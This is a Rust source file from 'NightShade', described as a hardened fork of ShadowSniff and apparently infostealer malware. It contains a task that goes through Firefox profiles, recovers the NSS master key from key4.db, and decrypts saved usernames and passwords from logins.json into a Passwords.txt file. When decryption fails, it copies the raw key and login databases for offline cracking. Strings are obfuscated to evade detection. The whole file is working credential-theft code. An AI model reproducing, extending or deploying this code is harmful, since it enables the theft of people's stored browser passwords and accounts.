/*
 * This file is part of NightShade (a hardened fork of sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use crate::gecko::GeckoBrowserData;
use crate::Password;
use alloc::string::ToString;
use alloc::sync::Arc;
use alloc::vec::Vec;
use collector::{Browser, Collector};
use derive_new::new;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use filesystem::{FileSystem, WriteTo, copy_file};
use json::parse;
use obfstr::obfstr as s;
use tasks::Task;

use super::nss;

#[derive(new)]
pub struct PasswordTask<'a> {
    browser: Arc<GeckoBrowserData<'a>>,
}

impl<C: Collector, F: FileSystem> Task<C, F> for PasswordTask<'_> {
    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let mut at_least_one = false;

        for profile in &self.browser.profiles {
            let Some(name) = profile.name() else {
                continue;
            };

            // Native decryption first: key4.db + logins.json via the NSS
            // PBKDF2-SHA256/3DES scheme (Firefox >= 63).
            let passwords = read_profile_passwords(&StorageFileSystem, profile);

            let Some(passwords) = passwords.filter(|p| !p.is_empty()) else {
                // Decryption unavailable (legacy key3.db, unsupported KDF,
                // unreadable items...) — archive the raw artifacts so an
                // offline tool still has everything it needs.
                [s!("key3.db"), s!("key4.db"), s!("logins.json")]
                    .iter()
                    .for_each(|file| {
                        let _ = copy_file(
                            StorageFileSystem,
                            profile / file,
                            filesystem,
                            parent / name,
                            true,
                        )
                        .map(|_| at_least_one = true);
                    });

                continue;
            };

            collector
                .get_browser()
                .increase_passwords_by(passwords.len());

            if write_passwords(&passwords, filesystem, &(parent / name / s!("Passwords.txt")))
                .is_ok()
            {
                at_least_one = true;
            }
        }
    }
}

fn read_profile_passwords<F>(filesystem: &F, profile: &Path) -> Option<Vec<Password>>
where
    F: FileSystem,
{
    let logins_path = profile / s!("logins.json");
    let key4_path = profile / s!("key4.db");

    if !filesystem.is_exists(&logins_path) || !filesystem.is_exists(&key4_path) {
        return None;
    }

    let key4_bytes = StorageFileSystem.read_file(&key4_path).ok()?;
    let master_key = nss::recover_master_key(&key4_bytes)?;

    let logins_bytes = StorageFileSystem.read_file(&logins_path).ok()?;
    let logins = parse(&logins_bytes).ok()?;

    let entries = logins.get(s!("logins"))?.as_array()?.clone();

    let mut passwords = Vec::new();

    for entry in entries {
        let origin = entry
            .get(s!("hostname"))
            .and_then(|v| v.as_string());

        let username = entry
            .get(s!("encryptedUsername"))
            .and_then(|v| v.as_string())
            .and_then(|v| nss::decrypt_login_item(&master_key, &v))
            .map(Arc::from);

        let password = entry
            .get(s!("encryptedPassword"))
            .and_then(|v| v.as_string())
            .and_then(|v| nss::decrypt_login_item(&master_key, &v))
            .map(Arc::from);

        if username.is_some() || password.is_some() {
            passwords.push(Password {
                origin,
                username,
                password,
            });
        }
    }

    Some(passwords)
}

fn write_passwords<F>(data: &[Password], filesystem: &F, dst: &Path) -> Result<(), u32>
where
    F: FileSystem,
{
    let joined = data
        .iter()
        .map(|p| p.to_string())
        .collect::<Vec<_>>()
        .join("\n");

    joined.write_to(filesystem, dst)
}
